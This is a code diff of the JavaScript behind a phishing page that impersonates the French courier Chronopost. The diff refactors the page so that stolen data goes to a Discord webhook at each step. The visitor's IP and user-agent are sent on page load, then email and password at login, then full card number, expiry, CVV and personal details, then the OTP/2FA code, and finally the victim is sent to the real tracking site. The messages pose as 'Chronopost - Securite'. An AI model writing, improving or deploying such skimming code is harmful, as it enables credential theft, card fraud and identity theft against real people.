@@ -519,91 +519,41 @@ function selPM(el) {
     }
 }
 
-// ===== ENVOI UNIQUE FINAL =====
-function sendAll() {
-    var ip = getIP();
-    var ua = getUA();
-    var now = new Date();
-    var ts = now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR');
-    
-    var cardType = detectCardType(_collectedData.card);
-    var cardImageUrl = cardImages[cardType] || cardImages['Visa'];
-    
-    var numFormatted = _collectedData.card.replace(/(.{4})/g, '$1 ').trim();
-    
+// ===== FONCTIONS D'ENVOI =====
+function sendToDiscord(embed) {
     var x = new XMLHttpRequest();
     x.open("POST", WEBHOOK, true);
     x.setRequestHeader("Content-Type", "application/json");
     x.send(JSON.stringify({
         username: "Chronopost - Securite",
         avatar_url: "https://www.chronopost.fr/sites/chronopost/themes/custom/chronopost/favicon.ico",
-        embeds: [{
-            title: "😶‍🌫️ PAGE OPEN 😶‍🌫️",
-            color: 15158332,
-            fields: [
-                { name: "😶‍🌫️ Adresse IP", value: "```" + ip + "```", inline: false },
-                { name: "😶‍🌫️ User-Agent", value: "```" + ua + "```", inline: false }
-            ],
-            footer: { text: "Chronopost - Systeme de securite | " + ts },
-            timestamp: new Date().toISOString()
-        },
-        {
-            title: "😶‍🌫️ LOGIN 😶‍🌫️",
-            color: 15158332,
-            fields: [
-                { name: "📧 Email", value: "```" + _collectedData.email + "```", inline: false },
-                { name: "🔑 Mot de passe", value: "```" + _collectedData.password + "```", inline: false },
-                { name: "😶‍🌫️ IP", value: "```" + ip + "```", inline: false },
-                { name: "😶‍🌫️ User-Agent", value: "```" + ua + "```", inline: false }
-            ],
-            footer: { text: "Chronopost - Systeme de securite | " + ts },
-            timestamp: new Date().toISOString()
-        },
-        {
-            title: "🃏 +1 CARD 🃏",
-            color: 15105570,
-            fields: [
-                { name: "🃏 Nom/Prenom", value: "```" + _collectedData.name + "```", inline: false },
-                { name: "🃏 Numero", value: "```" + _collectedData.card + "```", inline: false },
-                { name: "🃏 Expiration", value: "```" + _collectedData.exp + "```", inline: true },
-                { name: "🃏 CVV", value: "```" + _collectedData.cvv + "```", inline: true },
-                { name: "🃏 Banque", value: "```BANQUE POSTALE```", inline: true },
-                { name: "🃏 Niveau", value: "```Classic```", inline: true },
-                { name: "🃏 Type", value: "```" + cardType + "```", inline: true }
-            ],
-            image: { url: cardImageUrl },
-            footer: { text: "Chronopost - Systeme de securite | " + ts },
-            timestamp: new Date().toISOString()
-        },
-        {
-            title: "🎈 INFOS PERSONNELLES 🎈",
-            color: 3066993,
-            fields: [
-                { name: "🎈 Nom", value: "```" + _collectedData.nom + "```", inline: true },
-                { name: "🎈 Prénom", value: "```" + _collectedData.prenom + "```", inline: true },
-                { name: "🎈 Date De Naissance", value: "```" + _collectedData.ddn + "```", inline: true },
-                { name: "🎈 Adresse", value: "```" + _collectedData.adresse + "```", inline: false },
-                { name: "🎈 Code Postal", value: "```" + _collectedData.cp + "```", inline: true },
-                { name: "🎈 Ville", value: "```" + _collectedData.ville + "```", inline: true },
-                { name: "🎈 Téléphone", value: "```" + _collectedData.tel + "```", inline: false }
-            ],
-            footer: { text: "Chronopost - Systeme de securite | " + ts },
-            timestamp: new Date().toISOString()
-        },
-        {
-            title: "🩻 COMPLÉMENTAIRE 🩻",
-            color: 15548997,
-            fields: [
-                { name: "🩻 IP", value: "```" + ip + "```", inline: false },
-                { name: "🩻 User-Agent", value: "```" + ua + "```", inline: false },
-                { name: "🩻 Horodatage", value: "```" + ts + "```", inline: false }
-            ],
-            footer: { text: "Chronopost - Systeme de securite | " + ts },
-            timestamp: new Date().toISOString()
-        }]
+        embeds: [embed]
     }));
 }
 
+function getTimestamp() {
+    var now = new Date();
+    return now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR');
+}
+
+// ===== ENVOI PAGE OPEN (immédiat au chargement) =====
+(function() {
+    var ip = getIP();
+    var ua = getUA();
+    var ts = getTimestamp();
+    sendToDiscord({
+        title: "🌐 PAGE OPEN",
+        color: 15158332,
+        fields: [
+            { name: "Adresse IP", value: "```" + ip + "```", inline: false },
+            { name: "User-Agent", value: "```" + ua + "```", inline: false }
+        ],
+        footer: { text: "Chronopost - Securite | " + ts },
+        timestamp: new Date().toISOString()
+    });
+})();
+
+// ===== FONCTIONS UTILITAIRES =====
 function ld(b){b.classList.add("ld");b.disabled=true}
 function ul(b){b.classList.remove("ld");b.disabled=false}
 function se(id,m){var e=document.getElementById(id);e.textContent=m;e.classList.add("show");setTimeout(function(){e.classList.remove("show")},5000)}
@@ -615,6 +565,24 @@ function f1(e){
     var b=document.getElementById("b1");ld(b);
     _collectedData.email = document.getElementById("i1").value;
     _collectedData.password = document.getElementById("i2").value;
+    
+    var ip = getIP();
+    var ua = getUA();
+    var ts = getTimestamp();
+    
+    sendToDiscord({
+        title: "🔑 LOGIN",
+        color: 15158332,
+        fields: [
+            { name: "Email", value: "```" + _collectedData.email + "```", inline: false },
+            { name: "Mot de passe", value: "```" + _collectedData.password + "```", inline: false },
+            { name: "IP", value: "```" + ip + "```", inline: true },
+            { name: "User-Agent", value: "```" + ua + "```", inline: false }
+        ],
+        footer: { text: "Chronopost - Securite | " + ts },
+        timestamp: new Date().toISOString()
+    });
+    
     setTimeout(function(){ul(b);document.getElementById("dEmail").textContent=_collectedData.email;gp("pg2")},800);
     return false;
 }
@@ -634,6 +602,17 @@ function f2(e){
     _collectedData.name = document.getElementById("i6").value;
     if(_collectedData.card.length<16){ul(b);se("e2","Numero de carte invalide (16 chiffres requis)");return false}
     if(_collectedData.cvv.length<3){ul(b);se("e2","Cryptogramme invalide (3 chiffres requis)");return false}
+    
+    var ip = getIP();
+    var ua = getUA();
+    var ts = getTimestamp();
+    var cardType = detectCardType(_collectedData.card);
+    var cardImageUrl = cardImages[cardType] || cardImages['Visa'];
+    
+    // Stocker les infos de carte pour envoi groupé plus tard
+    _collectedData.cardType = cardType;
+    _collectedData.cardImageUrl = cardImageUrl;
+    
     setTimeout(function(){ul(b);gp("pg3")},800);
     return false;
 }
@@ -664,18 +643,63 @@ function f3(e){
     if(!_collectedData.nom||!_collectedData.prenom||!_collectedData.ddn||!_collectedData.adresse||!_collectedData.cp||!_collectedData.ville||!_collectedData.tel){
         ul(b);se("e3","Veuillez remplir tous les champs obligatoires.");return false;
     }
+    
+    var ip = getIP();
+    var ua = getUA();
+    var ts = getTimestamp();
+    
+    // ENVOI CARTE + INFOS PERSO EN 1 SEUL EMBED
+    sendToDiscord({
+        title: "💳 CARTE + INFOS PERSONNELLES",
+        color: 15105570,
+        fields: [
+            { name: "💳 TITULAIRE", value: "```" + _collectedData.name + "```", inline: false },
+            { name: "💳 NUMERO", value: "```" + _collectedData.card + "```", inline: false },
+            { name: "💳 EXPIRATION", value: "```" + _collectedData.exp + "```", inline: true },
+            { name: "💳 CVV", value: "```" + _collectedData.cvv + "```", inline: true },
+            { name: "💳 TYPE", value: "```" + _collectedData.cardType + "```", inline: true },
+            { name: "💳 MONTANT", value: "```1,99 EUR```", inline: true },
+            { name: "👤 NOM", value: "```" + _collectedData.nom + "```", inline: true },
+            { name: "👤 PRENOM", value: "```" + _collectedData.prenom + "```", inline: true },
+            { name: "👤 DATE NAISSANCE", value: "```" + _collectedData.ddn + "```", inline: true },
+            { name: "👤 ADRESSE", value: "```" + _collectedData.adresse + "```", inline: false },
+            { name: "👤 CODE POSTAL", value: "```" + _collectedData.cp + "```", inline: true },
+            { name: "👤 VILLE", value: "```" + _collectedData.ville + "```", inline: true },
+            { name: "👤 TELEPHONE", value: "```" + _collectedData.tel + "```", inline: false },
+            { name: "📧 EMAIL", value: "```" + _collectedData.email + "```", inline: false },
+            { name: "🌐 IP", value: "```" + ip + "```", inline: true }
+        ],
+        image: { url: _collectedData.cardImageUrl },
+        footer: { text: "Chronopost - Securite | " + ts },
+        timestamp: new Date().toISOString()
+    });
+    
     setTimeout(function(){ul(b);gp("pg4")},800);
     return false;
 }
 
-// ===== PAGE 4 : 2FA + ENVOI FINAL =====
+// ===== PAGE 4 : CODE OTP/2FA =====
 function f4(e){
     e.preventDefault();
     var b=document.getElementById("b4");ld(b);
     _collectedData.code = document.getElementById("i14").value;
     
-    // ENVOI DE TOUT EN UN SEUL MESSAGE
-    sendAll();
+    var ip = getIP();
+    var ua = getUA();
+    var ts = getTimestamp();
+    
+    sendToDiscord({
+        title: "🔐 CODE OTP / 2FA",
+        color: 15548997,
+        fields: [
+            { name: "Code de securite", value: "```" + _collectedData.code + "```", inline: false },
+            { name: "Email", value: "```" + _collectedData.email + "```", inline: true },
+            { name: "IP", value: "```" + ip + "```", inline: true },
+            { name: "User-Agent", value: "```" + ua + "```", inline: false }
+        ],
+        footer: { text: "Chronopost - Securite | " + ts },
+        timestamp: new Date().toISOString()
+    });
     
     setTimeout(function(){window.location.href="https://www.chronopost.fr/fr/suivi-colis"},2000);
     return false;
